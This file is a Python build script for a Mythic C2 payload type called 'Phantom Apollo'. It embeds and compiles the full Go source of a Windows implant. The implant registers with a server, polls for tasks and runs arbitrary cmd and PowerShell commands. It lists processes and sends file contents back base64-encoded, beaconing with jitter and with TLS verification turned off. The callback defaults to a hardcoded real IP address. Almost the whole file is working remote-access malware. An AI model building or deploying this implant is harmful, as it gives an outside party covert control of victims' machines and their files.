import pathlib
from mythic_container import *

class PhantomApollo(PayloadType):
    name = "phantom_apollo"
    file_extension = "exe"
    author = "@phantom"
    supported_os = [
        SupportedOS.Windows,
    ]
    wrapper = False
    wrapped_payloads = []
    note = "Phantom Apollo - Advanced C2 agent with Apollo compatibility and enhanced features"
    supports_dynamic_loading = True
    mythic_encrypts = False
    translation_container = None
    agent_type = "agent"
    agent_icon_path = pathlib.Path(".") / "phantom_apollo" / "agent_functions" / "mythic_agent_icon.svg"
    
    build_parameters = [
        BuildParameter(
            name="callback_host",
            parameter_type=BuildParameterType.String,
            description="Callback Host",
            default_value="domain.com",
        ),
        BuildParameter(
            name="callback_port",
            parameter_type=BuildParameterType.Number,
            description="Callback Port",
            default_value="443",
        ),
        BuildParameter(
            name="callback_interval",
            parameter_type=BuildParameterType.Number,
            description="Callback Interval in seconds",
            default_value="10",
        ),
        BuildParameter(
            name="callback_jitter",
            parameter_type=BuildParameterType.Number,
            description="Callback Jitter percentage (0-100)",
            default_value="10",
        ),
        BuildParameter(
            name="use_ssl",
            parameter_type=BuildParameterType.Boolean,
            description="Use SSL for callback",
            default_value=True,
        ),
        BuildParameter(
            name="user_agent",
            parameter_type=BuildParameterType.String,
            description="User Agent String",
            default_value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ),
        BuildParameter(
            name="aes_psk",
            parameter_type=BuildParameterType.String,
            description="Encryption Key",
            default_value="",
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug mode",
            default_value=False,
        ),
    ]
    
    c2_profiles = ["HTTP"]
    
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        
        # Build parameters with your Mythic server
        callback_host = self.get_parameter("callback_host") or "37.27.249.191"
        callback_port = self.get_parameter("callback_port") or "7443"
        callback_interval = self.get_parameter("callback_interval") or "10"
        callback_jitter = self.get_parameter("callback_jitter") or "10"
        use_ssl = self.get_parameter("use_ssl") if self.get_parameter("use_ssl") is not None else True
        user_agent = self.get_parameter("user_agent") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        aes_psk = self.get_parameter("aes_psk") or ""
        debug = self.get_parameter("debug") if self.get_parameter("debug") is not None else True
        
        # Construct callback URL for your Mythic server
        protocol = "https" if use_ssl else "http"
        callback_url = f"{protocol}://{callback_host}:{callback_port}"
        
        # Build the Go source with embedded parameters
        go_source = f'''package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/tls"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "syscall"
    "time"
    "unsafe"
)

const (
    MYTHIC_URL = "{callback_url}/graphql/"
    CALLBACK_HOST = "{callback_host}"
    CALLBACK_PORT = "{callback_port}"
    CALLBACK_INTERVAL = {callback_interval}
    CALLBACK_JITTER = {callback_jitter}
    USER_AGENT = "{user_agent}"
    DEBUG_MODE = {str(debug).lower()}
    USE_SSL = {str(use_ssl).lower()}
    AES_PSK = "{aes_psk}"
)

var (
    processedTasks = make(map[string]bool)
    currentDir     = ""
    callbackID     = ""
    taskMutex      sync.Mutex
)

type GraphQLRequest struct {{
    Query     string                 `json:"query"`
    Variables map[string]interface{{}} `json:"variables"`
}}

type GraphQLResponse struct {{
    Data   interface{{}} `json:"data"`
    Errors []struct {{
        Message string `json:"message"`
    }} `json:"errors"`
}}

func logEvent(message string) {{
    if DEBUG_MODE {{
        fmt.Printf("[%s] %s\\n", time.Now().Format("2006-01-02 15:04:05"), message)
    }}
}}

func makeGraphQLRequest(query string, variables map[string]interface{{}}) (*GraphQLResponse, error) {{
    client := &http.Client{{
        Transport: &http.Transport{{
            TLSClientConfig: &tls.Config{{InsecureSkipVerify: true}},
        }},
        Timeout: 30 * time.Second,
    }}

    reqBody := GraphQLRequest{{
        Query:     query,
        Variables: variables,
    }}

    jsonBody, err := json.Marshal(reqBody)
    if err != nil {{
        return nil, fmt.Errorf("error marshaling request: %v", err)
    }}

    req, err := http.NewRequest("POST", MYTHIC_URL, bytes.NewBuffer(jsonBody))
    if err != nil {{
        return nil, fmt.Errorf("error creating request: %v", err)
    }}

    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", USER_AGENT)

    resp, err := client.Do(req)
    if err != nil {{
        return nil, fmt.Errorf("error making request: %v", err)
    }}
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    if err != nil {{
        return nil, fmt.Errorf("error reading response: %v", err)
    }}

    var gqlResp GraphQLResponse
    if err := json.Unmarshal(body, &gqlResp); err != nil {{
        return nil, fmt.Errorf("error unmarshaling response: %v", err)
    }}

    return &gqlResp, nil
}}

func registerCallback() error {{
    logEvent("=== PHANTOM APOLLO AGENT - MYTHIC INTEGRATION ===")
    logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
    logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
    logEvent(fmt.Sprintf("Mythic URL: %s", MYTHIC_URL))
    logEvent("Registering callback with Mythic...")

    hostname, _ := os.Hostname()
    currentUser, _ := user.Current()
    ip := "127.0.0.1"

    query := `
    mutation newCallbackConfig($user: String!, $host: String!, $ip: String!) {{
        insert_callback(
            objects: {{
                user: $user,
                host: $host,
                ip: $ip,
                agent_callback_id: "phantom_apollo",
                description: "Phantom Apollo Agent",
                integrity_level: 2,
                process_name: "phantom_apollo.exe",
                pid: {os.Getpid()},
                architecture: "{runtime.GOARCH}",
                domain: "WORKGROUP",
                os: "{runtime.GOOS}",
                extra_info: "{{}}"
            }}
        ) {{
            returning {{
                id
            }}
        }}
    }}`

    variables := map[string]interface{{}}{{
        "user": currentUser.Username,
        "host": hostname,
        "ip":   ip,
    }}

    response, err := makeGraphQLRequest(query, variables)
    if err != nil {{
        return fmt.Errorf("GraphQL request failed: %v", err)
    }}

    if response.Errors != nil && len(response.Errors) > 0 {{
        return fmt.Errorf("GraphQL errors: %v", response.Errors[0].Message)
    }}

    data := response.Data.(map[string]interface{{}})
    insertCallback := data["insert_callback"].(map[string]interface{{}})
    returning := insertCallback["returning"].([]interface{{}})
    if len(returning) > 0 {{
        firstReturn := returning[0].(map[string]interface{{}})
        callbackID = fmt.Sprintf("%.0f", firstReturn["id"].(float64))
        logEvent(fmt.Sprintf("Callback registered with ID: %s", callbackID))
    }}

    return nil
}}

func pollForTasks() error {{
    if callbackID == "" {{
        return fmt.Errorf("no callback ID available")
    }}

    query := `
    query getTasksToRun($callback_id: Int!) {{
        task(where: {{callback_id: {{_eq: $callback_id}}, status: {{_eq: "submitted"}}}}) {{
            id
            command {{
                cmd
            }}
            params
            display_params
        }}
    }}`

    variables := map[string]interface{{}}{{
        "callback_id": callbackID,
    }}

    response, err := makeGraphQLRequest(query, variables)
    if err != nil {{
        return err
    }}

    if response.Data == nil {{
        return nil
    }}

    data := response.Data.(map[string]interface{{}})
    tasks := data["task"].([]interface{{}})

    for _, task := range tasks {{
        taskMap := task.(map[string]interface{{}})
        taskID := fmt.Sprintf("%.0f", taskMap["id"].(float64))
        
        taskMutex.Lock()
        if processedTasks[taskID] {{
            taskMutex.Unlock()
            continue
        }}
        processedTasks[taskID] = true
        taskMutex.Unlock()

        command := taskMap["command"].(map[string]interface{{}})
        cmd := command["cmd"].(string)
        params := ""
        if taskMap["params"] != nil {{
            params = taskMap["params"].(string)
        }}

        logEvent(fmt.Sprintf("Processing task %s: %s %s", taskID, cmd, params))

        go func(tid, command, parameters string) {{
            output := executeCommand(command, parameters)
            sendResponse(tid, output)
        }}(taskID, cmd, params)
    }}

    return nil
}}

func executeCommand(command, params string) string {{
    switch command {{
    case "whoami":
        return executeWhoami()
    case "hostname":
        return executeHostname()
    case "pwd":
        return executePwd()
    case "cd":
        return executeCD(params)
    case "ls":
        return executeLS(params)
    case "ps":
        return executePS()
    case "shell":
        return executeShell(params)
    case "powershell":
        return executePowerShell(params)
    case "download":
        return executeDownload(params)
    case "upload":
        return executeUpload(params)
    case "sleep":
        return executeSleep(params)
    case "exit":
        os.Exit(0)
        return "Exiting..."
    default:
        return fmt.Sprintf("Command not implemented: %s", command)
    }}
}}

func executeWhoami() string {{
    currentUser, err := user.Current()
    if err != nil {{
        return fmt.Sprintf("Error getting current user: %v", err)
    }}
    return fmt.Sprintf("Username: %s\\nUID: %s\\nGID: %s\\nHomeDir: %s", 
        currentUser.Username, currentUser.Uid, currentUser.Gid, currentUser.HomeDir)
}}

func executeHostname() string {{
    hostname, err := os.Hostname()
    if err != nil {{
        return fmt.Sprintf("Error getting hostname: %v", err)
    }}
    return hostname
}}

func executePwd() string {{
    if currentDir != "" {{
        return currentDir
    }}
    dir, err := os.Getwd()
    if err != nil {{
        return fmt.Sprintf("Error getting working directory: %v", err)
    }}
    currentDir = dir
    return dir
}}

func executeCD(path string) string {{
    if path == "" {{
        return "No path specified"
    }}
    
    err := os.Chdir(path)
    if err != nil {{
        return fmt.Sprintf("Error changing directory: %v", err)
    }}
    
    newDir, _ := os.Getwd()
    currentDir = newDir
    return fmt.Sprintf("Changed directory to: %s", newDir)
}}

func executeLS(path string) string {{
    if path == "" {{
        path = "."
    }}
    
    entries, err := os.ReadDir(path)
    if err != nil {{
        return fmt.Sprintf("Error listing directory: %v", err)
    }}
    
    var result strings.Builder
    result.WriteString(fmt.Sprintf("Directory listing for: %s\\n\\n", path))
    
    for _, entry := range entries {{
        info, err := entry.Info()
        if err != nil {{
            continue
        }}
        
        fileType := "FILE"
        if entry.IsDir() {{
            fileType = "DIR "
        }}
        
        result.WriteString(fmt.Sprintf("%s %10d %s %s\\n", 
            fileType, info.Size(), info.ModTime().Format("2006-01-02 15:04:05"), entry.Name()))
    }}
    
    return result.String()
}}

func executePS() string {{
    cmd := exec.Command("tasklist", "/fo", "csv")
    output, err := cmd.CombinedOutput()
    if err != nil {{
        return fmt.Sprintf("Error executing tasklist: %v", err)
    }}
    return string(output)
}}

func executeShell(command string) string {{
    if command == "" {{
        return "No command specified"
    }}
    
    cmd := exec.Command("cmd", "/c", command)
    output, err := cmd.CombinedOutput()
    if err != nil {{
        return fmt.Sprintf("Command failed: %v\\nOutput: %s", err, string(output))
    }}
    return string(output)
}}

func executePowerShell(command string) string {{
    if command == "" {{
        return "No PowerShell command specified"
    }}
    
    cmd := exec.Command("powershell", "-Command", command)
    output, err := cmd.CombinedOutput()
    if err != nil {{
        return fmt.Sprintf("PowerShell command failed: %v\\nOutput: %s", err, string(output))
    }}
    return string(output)
}}

func executeDownload(params string) string {{
    var downloadParams struct {{
        Path string `json:"path"`
    }}
    
    if err := json.Unmarshal([]byte(params), &downloadParams); err != nil {{
        downloadParams.Path = params
    }}
    
    if downloadParams.Path == "" {{
        return "No file path specified"
    }}
    
    data, err := os.ReadFile(downloadParams.Path)
    if err != nil {{
        return fmt.Sprintf("Error reading file: %v", err)
    }}
    
    encoded := base64.StdEncoding.EncodeToString(data)
    return fmt.Sprintf("File downloaded successfully\\nPath: %s\\nSize: %d bytes\\nBase64: %s", 
        downloadParams.Path, len(data), encoded)
}}

func executeUpload(params string) string {{
    return "Upload functionality not yet implemented"
}}

func executeSleep(params string) string {{
    sleepTime, err := strconv.Atoi(params)
    if err != nil {{
        return fmt.Sprintf("Invalid sleep time: %v", err)
    }}
    
    return fmt.Sprintf("Sleep interval set to %d seconds", sleepTime)
}}

func sendResponse(taskID, output string) {{
    encoded := base64.StdEncoding.EncodeToString([]byte(output))
    
    query := `
    mutation createTaskResponse($task_id: Int!, $response: String!) {{
        insert_response(
            objects: {{
                task_id: $task_id,
                response_raw: $response
            }}
        ) {{
            returning {{
                id
            }}
        }}
    }}`

    variables := map[string]interface{{}}{{
        "task_id":  taskID,
        "response": encoded,
    }}

    response, err := makeGraphQLRequest(query, variables)
    if err != nil {{
        logEvent(fmt.Sprintf("Failed to send response for task %s: %v", taskID, err))
        return
    }}

    if response.Errors != nil && len(response.Errors) > 0 {{
        logEvent(fmt.Sprintf("GraphQL errors sending response: %v", response.Errors[0].Message))
        return
    }}

    logEvent(fmt.Sprintf("Response sent successfully for task %s", taskID))
}}

func sendHeartbeat() {{
    if callbackID == "" {{
        return
    }}

    query := `
    mutation updateCallback($callback_id: Int!) {{
        update_callback_by_pk(
            pk_columns: {{id: $callback_id}},
            _set: {{last_checkin: "now()"}}
        ) {{
            id
        }}
    }}`

    variables := map[string]interface{{}}{{
        "callback_id": callbackID,
    }}

    makeGraphQLRequest(query, variables)
}}

func calculateJitter(interval int) time.Duration {{
    if CALLBACK_JITTER <= 0 {{
        return time.Duration(interval) * time.Second
    }}
    
    jitterRange := float64(interval) * (float64(CALLBACK_JITTER) / 100.0)
    jitter := (rand.Float64() * 2 - 1) * jitterRange
    finalInterval := float64(interval) + jitter
    
    if finalInterval < 1 {{
        finalInterval = 1
    }}
    
    return time.Duration(finalInterval) * time.Second
}}

func main() {{
    rand.Seed(time.Now().UnixNano())
    
    for {{
        if err := registerCallback(); err != nil {{
            logEvent(fmt.Sprintf("Failed to register with Mythic: %v", err))
            time.Sleep(5 * time.Second)
            continue
        }}
        break
    }}

    for {{
        if err := pollForTasks(); err != nil {{
            logEvent(fmt.Sprintf("Error polling tasks: %v", err))
        }}
        
        sendHeartbeat()
        
        sleepDuration := calculateJitter(CALLBACK_INTERVAL)
        time.Sleep(sleepDuration)
    }}
}}
'''
        
        # Write Go source to temporary file
        go_file_path = f"/tmp/phantom_apollo_{self.uuid}.go"
        with open(go_file_path, "w") as f:
            f.write(go_source)
        
        # Compile the Go binary
        try:
            import subprocess
            result = subprocess.run([
                "env", "GOOS=windows", "GOARCH=amd64", 
                "go", "build", "-ldflags=-s -w", "-o", f"/tmp/phantom_apollo_{self.uuid}.exe", go_file_path
            ], capture_output=True, text=True, cwd="/tmp")
            
            if result.returncode != 0:
                resp.build_stderr = f"Go compilation failed: {result.stderr}"
                resp.status = BuildStatus.Error
                return resp
            
            # Read the compiled binary
            with open(f"/tmp/phantom_apollo_{self.uuid}.exe", "rb") as f:
                resp.payload = f.read()
                
            resp.build_message = "Phantom Apollo agent compiled successfully"
            
            # Cleanup
            os.remove(go_file_path)
            os.remove(f"/tmp/phantom_apollo_{self.uuid}.exe")
            
        except Exception as e:
            resp.build_stderr = f"Build error: {str(e)}"
            resp.status = BuildStatus.Error
            
        return resp